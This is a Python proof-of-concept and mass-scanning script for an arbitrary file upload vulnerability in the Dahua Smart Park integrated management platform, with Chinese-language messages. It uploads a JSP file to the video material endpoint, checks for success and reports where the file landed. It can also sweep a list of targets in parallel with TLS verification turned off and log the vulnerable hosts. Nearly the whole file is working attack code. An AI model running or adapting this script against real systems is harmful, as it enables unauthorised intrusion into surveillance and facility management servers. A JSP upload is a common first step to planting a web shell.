import argparse
import requests
import sys
import re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def banner():
    # Placeholder for displaying a banner
    pass

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台video任意文件上传漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help="Single URL to test")
    parser.add_argument('-f', '--file', dest='file', type=str, help='File containing URLs (one per line)')
    
    args = parser.parse_args()
    
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for line in fp:
                url_list.append(line.strip())
        pool = Pool(10)  # Adjust pool size as needed
        pool.map(poc, url_list)
        pool.close()
        pool.join()
    else:
        parser.print_help()
        sys.exit(1)

def poc(target):
    url_payload = '/publishing/publishing/material/file/video'
    url = target + url_payload
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=dd8f988919484abab3816881c55272a7",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close"
    }
    
    data = (
        "--dd8f988919484abab3816881c55272a7\r\n"
        "Content-Disposition: form-data; name=\"Filedata\"; filename=\"Test.jsp\"\r\n\r\n"
        "Test\r\n"
        "--dd8f988919484abab3816881c55272a7\r\n"
        "Content-Disposition: form-data; name=\"Submit\"\r\n\r\n"
        "submit\r\n"
        "--dd8f988919484abab3816881c55272a7--\r\n"
    )
    
    try:
        response = requests.post(url=url, headers=headers, data=data, timeout=10, verify=False)
        match = re.search(r'"data":\s*{"id":\d+,"path":"([^"]+)"', response.text)
        
        if response.status_code == 200 and "success" in response.text and match:
            result = target + '/publishingImg/' + match.group(1)
            print(f"[+] {target} 存在文件上传漏洞！\n[+] 访问：{result}")
            with open('result.txt', 'a', encoding='utf-8') as f:
                f.write(target + '\n')
        else:
            print(f"[-] {target} 不存在漏洞！")
    except Exception as e:
        pass

if __name__ == '__main__':
    main()
